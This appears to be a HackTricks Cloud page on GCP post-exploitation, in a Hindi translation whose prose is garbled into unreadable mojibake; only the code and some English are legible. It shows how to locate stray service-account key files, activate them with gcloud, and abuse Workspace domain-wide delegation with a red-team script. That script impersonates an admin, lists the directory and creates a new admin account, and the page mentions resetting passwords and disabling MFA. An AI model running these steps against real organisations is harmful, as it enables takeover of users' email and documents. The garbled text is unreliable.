рдпреЗ рдлрд╛рдЗрд▓реЗрдВ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдкреНрдпреВрдЯ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрдиреНрд╣реЗрдВ рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реЛрдирд╛ рдкрдбрд╝реЗрдЧрд╛ред рдлрд╛рдЗрд▓ рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдирд╛рдо `[project-id]-[portion-of-key-id].json` рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдирд╛рдо `test-project` рд╣реИ рддреЛ рдЖрдк **рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ `test-project*.json` рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЗрд╕ рдХреА рдлрд╛рдЗрд▓ рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдПред

рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддреА рд╣реИ:
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
рдпрд╛, рдпрджрд┐ **CLI рд╕реЗ рдЬрдирд░реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛** рддреЛ рд╡реЗ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдВрдЧреЗ:
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдкрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **`gcloud` рдХрдорд╛рдВрдб рдХреЛ рдЗрд╕ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдкреБрдирдГ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЖрдк рдпрд╣ рдХрд╛рд░реНрдп рдЙрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░, рдпрд╛ рдХрд┐рд╕реА рднреА рдорд╢реАрди рдкрд░ рдЬрд┐рд╕ рдкрд░ рдЯреВрд▓реНрд╕ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реИрдВ, рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
gcloud auth activate-service-account --key-file [FILE]
```
рдЕрдм рдЖрдк рдЕрдкрдиреЗ рдирдП OAuth рдЯреЛрдХрди рдХрд╛ **рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЗрд╕ рдкреНрд░рдХрд╛рд░:
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
рдЖрдкрдХреЛ `https://www.googleapis.com/auth/cloud-platform` рд╕реНрдХреЛрдкреНрд╕ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдк **рдХрд┐рд╕реА рднреА рдЗрдВрд╕реНрдЯреЗрдВрд╕-рд╕реНрддрд░ рдХреЗ рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдкреНрд╕ рд╕реЗ рд╕реАрдорд┐рдд рдирд╣реАрдВ рд╣реИрдВ**ред рдЕрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдкрдиреЗ рд╕рднреА рдирд┐рд░реНрдзрд╛рд░рд┐рдд IAM рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдкреВрд░реНрдг рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдкреВрд░реА рд╢рдХреНрддрд┐ рд╣реИред

## Workspace рдореЗрдВ рдкреНрд░рд╕рд╛рд░ рдХрд░рдирд╛ рдбреЛрдореЗрди-рд╡реНрдпрд╛рдкреА рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдкреНрд░рддрд┐рдирд┐рдзрд┐рдордВрдбрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) Google рдХрд╛ **рд╕рд╣рдпреЛрдЧ рдФрд░ рдЙрддреНрдкрд╛рджрдХрддрд╛ рдордВрдЪ** рд╣реИ рдЬрд┐рд╕рдореЗрдВ Gmail, Google Calendar, Google Drive, Google Docs, рдЖрджрд┐ рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

GCP рдореЗрдВ **рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ** рдХреЛ Workspace рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ **рдЕрдзрд┐рдХрд╛рд░ рджрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗред рдЗрд╕реЗ [рдбреЛрдореЗрди-рд╡реНрдпрд╛рдкреА рдкреНрд░рддрд┐рдирд┐рдзрд┐рдордВрдбрд▓](https://developers.google.com/admin-sdk/reports/v1/guides/delegation) рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ GMail рдореЗрдВ **рдИрдореЗрд▓ рдкрдврд╝рдирд╛**, Google Docs рддрдХ рдкрд╣реБрдВрдЪрдирд╛, рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ G Suite рд╕рдВрдЧрдарди рдореЗрдВ рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдмрдирд╛рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред

Workspace рдХрд╛ [рдЕрдкрдирд╛ API](https://developers.google.com/gsuite/aspects/apis) рд╣реИ, рдЬреЛ GCP рд╕реЗ рдкреВрд░реА рддрд░рд╣ рдЕрд▓рдЧ рд╣реИред рдЕрдиреБрдорддрд┐рдпрд╛рдВ Workspace рдХреЛ рджреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ **GCP рдФрд░ Workspace рдХреЗ рдмреАрдЪ рдХреЛрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрдмрдВрдз рдирд╣реАрдВ рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ рдХреЛ Workspace рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░ **рдЕрдиреБрдорддрд┐рдпрд╛рдВ рджреЗрдирд╛** рд╕рдВрднрд╡ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ рд╕рдордп Web UI рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк **IAM -> Service Accounts** рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХрд┐рд╕реА рдЦрд╛рддреЗ рдореЗрдВ **"Enabled" "domain-wide delegation" рдХреЙрд▓рдо рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╕реВрдЪреАрдмрджреНрдз рд╣реИ**ред рдпрджрд┐ рдХреЛрдИ рдЦрд╛рддреЗ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ рддреЛ рдХреЙрд▓рдо рд╕реНрд╡рдпрдВ **рдкреНрд░рдХрдЯ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛** (рдЖрдк рдкреНрд░рддреНрдпреЗрдХ рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ рдХрд╛ рд╡рд┐рд╡рд░рдг рдкрдврд╝рдХрд░ рдЗрд╕рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдЗрд╕ рд▓реЗрдЦрди рдХреЗ рд╕рдордп, рдЗрд╕реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ Google рдХреЗ рдмрдЧ рдЯреНрд░реИрдХрд░ рдореЗрдВ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ [рдЕрдиреБрд░реЛрдз](https://issuetracker.google.com/issues/116182848) рд╣реИред

рдЗрд╕ рд╕рдВрдмрдВрдз рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ GCP рдореЗрдВ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде-рд╕рд╛рде Workforce рдореЗрдВ рднреА рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

#### Workspace рдПрдХреНрд╕реЗрд╕ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ

рдЗрд╕ рдПрдХреНрд╕реЗрд╕ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ рдХреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ JSON** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХреА рдЧрдИ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдЖрдкрдиреЗ рдпреЗ рдкрд╣рд▓реЗ рдХреЗ рдЪрд░рдг рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдм рдРрд╕реЗ рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреБрдВрдЬреА рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдбреЛрдореЗрди-рд╡реНрдпрд╛рдкреА рдкреНрд░рддрд┐рдирд┐рдзрд┐рдордВрдбрд▓ рд╕рдХреНрд╖рдо рд╣реИред

рдпрд╣ рд╡рд┐рд╖рдп рдереЛрдбрд╝рд╛ рдЬрдЯрд┐рд▓ рд╣реИтАж рдЖрдкрдХреЗ рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ рдореЗрдВ "client_email" рдирд╛рдордХ рдХреБрдЫ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк JSON рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рд░реНрдпрд╛рдд рдХрд░рддреЗ рд╣реИрдВред рдпрд╣ рд╢рд╛рдпрдж рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ `account-name@project-name.iam.gserviceaccount.com`ред рдпрджрд┐ рдЖрдк рдкреНрд░рддрд┐рдирд┐рдзрд┐рдордВрдбрд▓ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдЙрд╕ рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ Workforce API рдХреЙрд▓реНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрд╕рдлрд▓ рд╣реЛрдВрдЧреЗред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ Workforce рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ GCP рд╕рд░реНрд╡рд┐рд╕ рдЦрд╛рддреЗ рдХреЗ рдИрдореЗрд▓ рдкрддреЗ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, Workforce рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╡реИрдз Workforce рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЖрдк рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛**, рдФрд░ рдлрд┐рд░ рдЙрд╕ рдкрд╣реБрдВрдЪ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдРрд╕рд╛ рдХрд░рдирд╛ рдЬреИрд╕реЗ **рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдХрд░рдирд╛, рдорд▓реНрдЯреА-рдлреИрдХреНрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдирд╛, рдпрд╛ рдмрд╕ рдЦреБрдж рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рд╢рд╛рдирджрд╛рд░ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдЦрд╛рддрд╛ рдмрдирд╛рдирд╛**ред

Gitlab рдиреЗ [рдпрд╣ Python рд╕реНрдХреНрд░рд┐рдкреНрдЯ](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp_misc/blob/master/gcp_delegation.py) рдмрдирд╛рдИ рд╣реИ рдЬреЛ рджреЛ рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреА рд╣реИ - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рдмрдирд╛рдирд╛ рдФрд░ рдПрдХ рдирдпрд╛ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдЦрд╛рддрд╛ рдмрдирд╛рдирд╛ред рдпрд╣рд╛рдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВрдЧреЗ:
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
```markdown
рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдИрдореЗрд▓ рдкрддреЛрдВ рдкрд░ рдЖрдЬрд╝рдорд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рд╡рд┐рднрд┐рдиреНрди** **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХреЗрдВред рд╕реНрдЯреИрдВрдбрд░реНрдб рдЖрдЙрдЯрдкреБрдЯ рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ Workforce рддрдХ рдкрд╣реБрдБрдЪ рд╣реИ, рдФрд░ рдпрджрд┐ рдирдпрд╛ рдПрдбрдорд┐рди рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕рдореЗрдВ **рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб рднреА рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛**ред

рдпрджрд┐ рдЖрдк рдирдпрд╛ рдПрдбрдорд┐рди рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк [Google admin console](https://admin.google.com) рдкрд░ рд▓реЙрдЧ рдСрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ G Suite рдХреЗ рд╣рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕рдм рдХреБрдЫ - рдИрдореЗрд▓, рдбреЙрдХреНрд╕, рдХреИрд▓реЗрдВрдбрд░, рдЖрджрд┐ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдореМрдЬ рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
```
